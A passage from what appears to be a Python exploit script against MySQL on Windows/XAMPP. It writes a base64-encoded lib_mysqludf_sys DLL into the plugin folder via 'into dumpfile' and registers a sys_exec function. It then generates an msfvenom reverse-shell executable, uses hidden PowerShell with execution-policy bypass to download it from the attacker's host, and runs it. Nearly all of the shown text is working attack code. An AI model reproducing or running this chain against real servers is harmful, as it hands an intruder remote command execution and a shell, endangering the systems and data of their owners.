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') into dumpfile 'C:/xampp/mysql/lib/plugin/{dllName}.dll'"
    cursor.execute(sql)
    print("[*] 32-bit architecture selected. Payload: lib_mysqludf_sys_32.dll")

print(f"[*] DLL {dllName} loaded.")
print("[*] Attempting to create function...")

# Create sys_exec function:
sql = f"CREATE FUNCTION sys_exec RETURNS integer SONAME '{dllName}.dll'"
cursor.execute(sql)
print(f"[*] Function successfully created. Generating msfvenom payload...")

# Generate reverse shell payload:
os.system(f'msfvenom -p windows/{args.architecture}/shell_reverse_tcp LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f exe > rev.exe')

print(f"[*] Attempting to download reverse shell.")
sql = f"select sys_exec('powershell -ep bypass -windowstyle hidden IEX(New-Object System.Net.WebClient).DownloadFile(\"http://{args.lhost}/rev.exe\", \"C:/Windows/Tasks/rev.exe\")')"
cursor.execute(sql)

print(f"[*] Payload uploaded. Attempting to execute...")
# Run the payload
sql = "select sys_exec('C:/xampp/mysql/data/rev.exe')"
print(f"[+++] Exploit completed. Enjoy your shell.")
cursor.execute(sql)
